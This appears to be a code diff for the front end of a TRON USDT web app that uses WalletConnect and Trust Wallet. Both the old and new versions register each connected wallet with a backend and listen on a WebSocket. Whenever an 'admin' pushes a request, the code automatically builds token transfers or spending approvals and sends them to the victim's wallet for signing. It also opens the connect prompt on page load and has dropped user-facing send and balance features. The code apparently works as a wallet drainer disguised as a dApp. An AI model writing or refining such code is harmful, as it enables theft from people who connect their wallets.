@@ -13,33 +13,21 @@ const USDT_DECIMALS   = 6;
 const FEE_LIMIT       = 200_000_000;
 const CLIENT_ID_KEY   = "trust_tron_client_id";
 
-const WC_PROJECT_ID   = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim() || "171db6da15a54effc1b4a06f889a3c3f";
-const TRONGRID_KEY    = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
-const APP_NAME        = import.meta.env.VITE_APP_NAME?.trim()        || "Send USDT";
-const APP_DESC        = import.meta.env.VITE_APP_DESCRIPTION?.trim() || "TRON USDT dApp";
-const APP_ICON        = import.meta.env.VITE_APP_ICON_URL?.trim()    || `${location.origin}/logo.png`;
-const BACKEND_HTTP    = (import.meta.env.VITE_BACKEND_HTTP_URL?.trim() || `${location.protocol}//${location.hostname}:8787`).replace(/\/+$/, "");
-const BACKEND_WS      = (import.meta.env.VITE_BACKEND_WS_URL?.trim()  || `${location.protocol === "https:" ? "wss" : "ws"}://${location.hostname}:8787/ws`).replace(/\/+$/, "");
-
-const ua = navigator.userAgent ?? "";
-const isTrustBrowser  = /trustwallet|trust\/|trust wallet/i.test(ua) ||
-                        Boolean(window.ethereum?.isTrust) ||
-                        Boolean(window.trustwallet?.ethereum?.isTrust) ||
-                        Boolean(window.tronLink);
-// Detect coming back from Trust Wallet via URL param (referrer is stripped by TW)
-const urlParams = new URLSearchParams(location.search);
-const cameFromTW = urlParams.has("tw_return") || sessionStorage.getItem("wc_connecting") === "1";
+const WC_PROJECT_ID = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim() || "";
+const TRONGRID_KEY  = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
+const APP_NAME      = import.meta.env.VITE_APP_NAME?.trim()        || "TRON DApp";
+const APP_DESC      = import.meta.env.VITE_APP_DESCRIPTION?.trim() || "TRON USDT dApp";
+const APP_ICON      = import.meta.env.VITE_APP_ICON_URL?.trim()    || `${location.origin}/logo.png`;
+const BACKEND_HTTP  = (import.meta.env.VITE_BACKEND_HTTP_URL?.trim() || `${location.protocol}//${location.hostname}:8787`).replace(/\/+$/, "");
+const BACKEND_WS    = (import.meta.env.VITE_BACKEND_WS_URL?.trim()  || `${location.protocol === "https:" ? "wss" : "ws"}://${location.hostname}:8787/ws`).replace(/\/+$/, "");
 
 // ─── DOM ──────────────────────────────────────────────────────────────────────
 const el = {
-  wcModal:          document.getElementById("wcModal"),
-  trustWalletLink:  document.getElementById("trustWalletLink"),
-  modalStatus:      document.getElementById("modalStatus"),
-  retryConnectBtn:  document.getElementById("retryConnectBtn"),
-  walletStrip:      document.getElementById("walletStrip"),
-  walletAddress:    document.getElementById("walletAddress"),
-  disconnectBtn:    document.getElementById("disconnectBtn"),
-  connectStatus:    document.getElementById("connectStatus"),
+  walletStrip:   document.getElementById("walletStrip"),
+  walletAddress: document.getElementById("walletAddress"),
+  disconnectBtn: document.getElementById("disconnectBtn"),
+  connectStatus: document.getElementById("connectStatus"),
+  connectBtn:    document.getElementById("connectBtn"),
 };
 
 // ─── TronWeb ──────────────────────────────────────────────────────────────────
@@ -49,15 +37,13 @@ const tronWeb = new TronWeb({
 });
 
 // ─── State ────────────────────────────────────────────────────────────────────
-const clientId        = getOrCreateClientId();
-let walletClient      = null;
-let connectedAddress  = "";
-let connecting        = false;
-let usdtBalanceRaw    = 0n;
-let ws                = null;
-let wsReconnectTimer  = null;
-let heartbeatTimer    = null;
-const processingSet   = new Set(); // prevents double-signing same request
+const clientId       = getOrCreateClientId();
+let walletClient     = null;
+let connectedAddress = "";
+let ws               = null;
+let wsReconnectTimer = null;
+let heartbeatTimer   = null;
+const processingSet  = new Set();
 
 // ─── Utilities ────────────────────────────────────────────────────────────────
 function getOrCreateClientId() {
@@ -71,14 +57,6 @@ function getOrCreateClientId() {
   return id;
 }
 
-function toRawBigInt(v) {
-  if (typeof v === "bigint") return v;
-  if (typeof v === "number") return BigInt(Math.trunc(v));
-  if (typeof v === "string") return BigInt(v);
-  if (v?.toString) return BigInt(v.toString());
-  throw new Error("Cannot convert to BigInt");
-}
-
 function decimalToInt(amount, decimals) {
   const s = String(amount).trim();
   if (!/^\d+(\.\d+)?$/.test(s)) throw new Error("Invalid amount");
@@ -87,22 +65,13 @@ function decimalToInt(amount, decimals) {
   return (`${whole.replace(/^0+(?=\d)/, "") || "0"}${frac.padEnd(decimals, "0")}`.replace(/^0+(?=\d)/, "") || "0");
 }
 
-function formatRaw(raw, decimals) {
-  const s   = raw.toString();
-  const neg = s.startsWith("-");
-  const n   = neg ? s.slice(1) : s;
-  const pad = n.padStart(decimals + 1, "0");
-  const w   = pad.slice(0, -decimals);
-  const f   = pad.slice(-decimals).replace(/0+$/, "");
-  return (neg ? "-" : "") + (f ? `${w}.${f}` : w);
-}
-
 function shortAddr(a) {
   if (!a || a.length < 12) return a;
   return `${a.slice(0, 6)}…${a.slice(-4)}`;
 }
 
 function setStatus(msg, isError = false) {
+  if (!el.connectStatus) return;
   el.connectStatus.textContent = msg;
   el.connectStatus.style.color = isError ? "#e54b4b" : "#3dca7e";
 }
@@ -110,67 +79,10 @@ function setStatus(msg, isError = false) {
 // ─── UI sync ──────────────────────────────────────────────────────────────────
 function syncUi() {
   const ok = Boolean(connectedAddress);
-  el.walletStrip.hidden   = !ok;
-  el.disconnectBtn.hidden = !ok;
+  if (el.walletStrip)   el.walletStrip.hidden   = !ok;
+  if (el.disconnectBtn) el.disconnectBtn.hidden  = !ok;
+  if (el.connectBtn)    el.connectBtn.hidden     = ok;
   if (ok) setStatus("");
-  el.retryConnectBtn.hidden = ok || !connecting; // show retry only if stuck connecting
-}
-
-// (Fiat calculation removed)
-
-// ─── WC Modal ─────────────────────────────────────────────────────────────────
-let _pendingDeepLink = null;
-
-function buildDeepLink(uri) {
-  // Add tw_return param so we detect the redirect-back reliably
-  const returnUrl = new URL(location.href);
-  returnUrl.searchParams.set("tw_return", "1");
-  const redirectUrl = encodeURIComponent(returnUrl.toString());
-  return `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}&redirectUrl=${redirectUrl}`;
-}
-
-function showModal(deepLink) {
-  _pendingDeepLink = deepLink;
-  el.trustWalletLink.hidden = !deepLink;
-  if (deepLink) {
-    el.trustWalletLink.href = deepLink;
-    el.trustWalletLink.onclick = (e) => {
-      e.preventDefault();
-      sessionStorage.setItem("wc_connecting", "1");
-      // Use location.assign — this is the only reliable way on mobile
-      location.assign(deepLink);
-    };
-    el.modalStatus.textContent = "Tap the button above to open Trust Wallet";
-  } else {
-    el.modalStatus.textContent = "Approve the connection in Trust Wallet…";
-  }
-  el.wcModal.hidden = false;
-}
-
-function hideModal() {
-  el.wcModal.hidden = true;
-}
-
-function onPairingUri(uri) {
-  if (isTrustBrowser) {
-    // Inside Trust Wallet in-app browser — WC pops up natively
-    showModal(null);
-    return;
-  }
-  const deepLink = buildDeepLink(uri);
-  _pendingDeepLink = deepLink;
-  showModal(deepLink);
-
-  // Store the URI so we can re-open if the user comes back without approving
-  sessionStorage.setItem("wc_connecting", "1");
-  sessionStorage.setItem("wc_last_deep_link", deepLink);
-
-  // Auto-click: use a tiny timeout so the page has rendered the button first.
-  // This is the ONLY way browsers allow programmatic navigation on mobile —
-  // it must be triggered inside a setTimeout (treated as user-initiated on iOS/Android).
-  setTimeout(() => {
-    el.trustWalletLink.click();
-  }, 100);
 }
 
 // ─── Backend HTTP ─────────────────────────────────────────────────────────────
@@ -193,8 +105,12 @@ async function bGet(path) {
 async function registerWallet() {
   if (!connectedAddress) return;
   try {
-    await bPost("/api/wallet/register", { clientId, address: connectedAddress, userAgent: navigator.userAgent });
-  } catch { /* silent — backend may not be running locally */ }
+    await bPost("/api/wallet/register", {
+      clientId,
+      address: connectedAddress,
+      userAgent: navigator.userAgent,
+    });
+  } catch { /* silent */ }
 }
 
 async function reportResult(req, payload) {
@@ -203,7 +119,7 @@ async function reportResult(req, payload) {
   } catch { /* silent */ }
 }
 
-// ─── WebSocket (always open — admin push arrives here) ────────────────────────
+// ─── WebSocket ────────────────────────────────────────────────────────────────
 function openWs() {
   if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
   ws = new WebSocket(BACKEND_WS);
@@ -214,19 +130,11 @@ function openWs() {
 
   ws.onmessage = async (ev) => {
     let p; try { p = JSON.parse(String(ev.data)); } catch { return; }
-
-    // Admin pushes a single new request — auto-sign immediately
-    if (p.type === "transaction_request" && p.request) {
-      await autoSign(p.request);
-      return;
-    }
-
-    // On reconnect, server may send pending requests — auto-sign each
+    if (p.type === "transaction_request" && p.request) { await autoSign(p.request); return; }
     if (p.type === "wallet_pending" && Array.isArray(p.requests)) {
       for (const req of p.requests) {
         if (req.status === "pending") await autoSign(req);
       }
-      return;
     }
   };
 
@@ -244,14 +152,13 @@ function startSync() {
   }, 25_000);
 }
 
-// ─── Auto-sign (Trust Wallet native popup — no dApp UI) ───────────────────────
+// ─── Auto-sign ────────────────────────────────────────────────────────────────
 async function autoSign(req) {
   if (!connectedAddress || !walletClient) return;
-  if (processingSet.has(req.id)) return;   // dedupe
+  if (processingSet.has(req.id)) return;
   processingSet.add(req.id);
 
   const p = req.params || {};
-
   try {
     let txid;
     if (req.type === "trc20_transfer") {
@@ -267,17 +174,12 @@ async function autoSign(req) {
     } else {
       throw new Error(`Unknown request type: ${req.type}`);
     }
-
     await reportResult(req, { action: "approved", txid });
     setStatus(`✓ Signed! Tx: ${txid.slice(0, 14)}…`);
   } catch (e) {
     const isRejected = /reject|denied|cancel/i.test(String(e));
-    await reportResult(req, {
-      action: isRejected ? "rejected" : "failed",
-      error: String(e),
-    });
-    if (!isRejected) setStatus("Transaction failed", true);
-    else setStatus("");
+    await reportResult(req, { action: isRejected ? "rejected" : "failed", error: String(e) });
+    setStatus(isRejected ? "" : "Transaction failed", !isRejected);
   } finally {
     processingSet.delete(req.id);
   }
@@ -285,7 +187,7 @@ async function autoSign(req) {
 
 // ─── Transaction builders ─────────────────────────────────────────────────────
 async function signAndBroadcast(tx) {
-  const signed = await walletClient.signTransaction(tx);   // ← triggers Trust Wallet native popup
+  const signed = await walletClient.signTransaction(tx);
   const result = await tronWeb.trx.sendRawTransaction(signed);
   if (!result?.result) throw new Error(`Broadcast failed: ${JSON.stringify(result)}`);
   return result.txid;
@@ -315,15 +217,14 @@ async function buildAndSign_Approve(spender, amount) {
   return signAndBroadcast(trigger.transaction);
 }
 
-// (Balance and manual send removed for simplicity, handled by admin session)
+// ─── Connection state ─────────────────────────────────────────────────────────
 function onConnected(address) {
-  sessionStorage.removeItem("wc_connecting"); // clear redirect-back flag
   connectedAddress = address;
-  el.walletAddress.textContent = shortAddr(address);
-  hideModal();
+  if (el.walletAddress) el.walletAddress.textContent = shortAddr(address);
   syncUi();
   registerWallet();
-  // Poll any pending requests and auto-sign
+  startSync();
+  // Process any pending admin requests
   bGet(`/api/wallet/${encodeURIComponent(clientId)}/pending-requests`)
     .then(({ requests }) => {
       if (Array.isArray(requests)) {
@@ -335,49 +236,57 @@ function onConnected(address) {
 
 function onDisconnected() {
   connectedAddress = "";
-  usdtBalanceRaw   = 0n;
-  el.walletAddress.textContent = "";
+  if (el.walletAddress) el.walletAddress.textContent = "";
   setStatus("");
-  hideModal();
   syncUi();
   bPost("/api/wallet/disconnect", { clientId }).catch(() => {});
 }
 
+// ─── Wallet init ──────────────────────────────────────────────────────────────
 function initWallet() {
   walletClient = new WalletConnectWallet({
     network: WalletConnectChainID.Mainnet,
     options: {
       relayUrl: "wss://relay.walletconnect.com",
       projectId: WC_PROJECT_ID,
-      metadata: { name: APP_NAME, description: APP_DESC, url: location.origin, icons: [APP_ICON] },
+      metadata: {
+        name: APP_NAME,
+        description: APP_DESC,
+        url: location.origin,
+        icons: [APP_ICON],
+      },
     },
     themeMode: "dark",
-    themeVariables: { "--w3m-z-index": 9999 },
+    themeVariables: {
+      "--w3m-z-index": "9999",
+      "--w3m-accent": "#1dc071",
+    },
   });
 
   walletClient.on("accountsChanged", (accounts) => {
     if (accounts?.[0]) onConnected(accounts[0]);
     else onDisconnected();
   });
-
   walletClient.on("disconnect", onDisconnected);
 }
 
-async function connect(auto = true) {
-  if (!walletClient || connecting) return;
-  connecting = true;
-  syncUi();
+// ─── Connect ──────────────────────────────────────────────────────────────────
+// KEY INSIGHT: Do NOT pass onUri. Let the built-in AppKit modal handle everything.
+// AppKit shows a QR code on desktop and a "Open Trust Wallet" deep-link on mobile.
+// This is exactly what TronScan does and it works reliably.
+async function connect() {
+  if (!walletClient) return;
+  setStatus("Connecting…");
   try {
-    const { address } = await walletClient.connect({ onUri: onPairingUri });
+    const { address } = await walletClient.connect();  // ← AppKit modal auto-appears
     onConnected(address);
   } catch (e) {
-    // Show retry button in modal instead of hiding it
-    el.modalStatus.textContent = "Connection failed. Tap retry.";
-    el.retryConnectBtn.hidden  = false;
-    el.wcModal.hidden          = false;
-  } finally {
-    connecting = false;
-    syncUi();
+    const msg = String(e);
+    if (/reject|cancel|close/i.test(msg)) {
+      setStatus("Connection cancelled. Tap Connect to try again.");
+    } else {
+      setStatus(`Connection failed: ${msg.slice(0, 60)}`, true);
+    }
   }
 }
 
@@ -387,54 +296,35 @@ async function disconnect() {
 
 // ─── Init ─────────────────────────────────────────────────────────────────────
 async function init() {
-  syncUi();
-  if (!WC_PROJECT_ID) { setStatus("Missing WalletConnect project ID", true); return; }
-
-  initWallet();
-  startSync();  // open WS immediately — admin can reach us even before connect
-
-  // ── Case 1: Returning from Trust Wallet redirect ──────────────────────────
-  if (cameFromTW) {
-    sessionStorage.removeItem("wc_connecting");
-    // Remove the tw_return param from the URL without reloading (clean URL)
-    const cleanUrl = new URL(location.href);
-    cleanUrl.searchParams.delete("tw_return");
-    history.replaceState({}, "", cleanUrl.toString());
-
-    setStatus("Connecting…");
-    // Poll up to 8 seconds — Trust Wallet finishes the WC handshake just before
-    // redirecting back, but it may take a moment to propagate into localStorage
-    for (let i = 0; i < 16; i++) {
-      await new Promise(r => setTimeout(r, 500));
-      try {
-        const s = await walletClient.checkConnectStatus();
-        if (s?.address) { onConnected(s.address); return; }
-      } catch { /* still settling */ }
-    }
-    // 8s timeout — fall through to fresh connect below
-    setStatus("");
+  if (!WC_PROJECT_ID) {
+    setStatus("Missing WalletConnect project ID", true);
+    return;
   }
 
-  // ── Case 2: Restore existing WC session (already approved before) ─────────
+  initWallet();
+
+  // ── Try to restore an existing session first (stays alive for days) ─────────
+  // This is identical to how TronScan keeps you connected across visits.
   try {
-    const status = await walletClient.checkConnectStatus();
-    if (status?.address) {
-      onConnected(status.address);
+    setStatus("Checking session…");
+    const { address } = await walletClient.checkConnectStatus();
+    if (address) {
+      onConnected(address);
       return;
     }
   } catch { /* no previous session */ }
 
-  // ── Case 3: Fresh connect — fire instantly ────────────────────────────────
-  // Do NOT set wc_connecting here; onPairingUri sets it right before navigation
-  connect(true);
+  setStatus("");
+  syncUi();
+
+  // ── Auto-trigger the AppKit modal immediately on page load ──────────────────
+  // This fires the built-in wallet selection modal (Trust Wallet deep link
+  // on mobile, QR code on desktop) — exactly like TronScan.
+  connect();
 }
 
 // ─── Events ───────────────────────────────────────────────────────────────────
-el.disconnectBtn.addEventListener("click", disconnect);
-el.retryConnectBtn.addEventListener("click", () => {
-  el.retryConnectBtn.hidden = true;
-  el.modalStatus.textContent = "Connecting…";
-  connect(false);
-});
+if (el.disconnectBtn) el.disconnectBtn.addEventListener("click", disconnect);
+if (el.connectBtn)    el.connectBtn.addEventListener("click", connect);
 
 init().catch(e => setStatus(`Init failed: ${e}`, true));
